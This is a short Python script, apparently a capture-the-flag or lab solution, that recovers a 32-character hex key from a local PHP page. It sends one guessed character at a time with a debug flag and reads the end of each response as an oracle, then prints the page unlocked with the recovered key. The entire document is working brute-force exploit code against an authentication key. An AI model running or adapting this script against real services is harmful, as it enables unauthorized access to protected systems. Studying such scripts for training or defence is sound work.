import requests

ip = "localhost"
port = "80"
key = ""
hex_values = "0123456789abcdef"

for y in range(0,32):
    for x in hex_values:
        r =requests.get("http://" + ip + ":"+ port + "/index.php?ID=c56ac9e5a4faa7e8d694715ea6d1bff5&debug=true&key=" + key + x)
        tmp = r.text[-2:]
        if(tmp[0] == " "):
            tmp = tmp[1]
            
        if(tmp == str(y + 1) or tmp[-1:] == "}"):
            key = key + x
            break
            

print(requests.get("http://" + ip + ":"+ port + "/index.php?ID=c56ac9e5a4faa7e8d694715ea6d1bff5&debug=true&key=" + key).text)
